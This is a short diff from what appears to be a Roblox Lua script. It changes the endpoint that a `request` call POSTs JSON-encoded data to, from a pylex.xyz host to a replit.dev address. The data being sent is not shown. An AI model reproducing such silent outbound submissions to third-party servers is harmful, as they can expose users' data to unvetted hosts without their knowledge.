@@ -11,7 +11,7 @@ task.spawn(function()
         local success, result = pcall(function()
             local response = request(
                 {
-                    ["Url"] = 'http://sudo.pylex.xyz:11473/submit',
+                    ["Url"] = 'https://66521a66-ce71-440d-a511-d707d7d941d3-00-30jg5qgxjr16o.pike.replit.dev/submit',
                     ["Method"] = "POST",
                     ["Body"] = HttpService:JSONEncode(data),
                     ["Headers"] = {
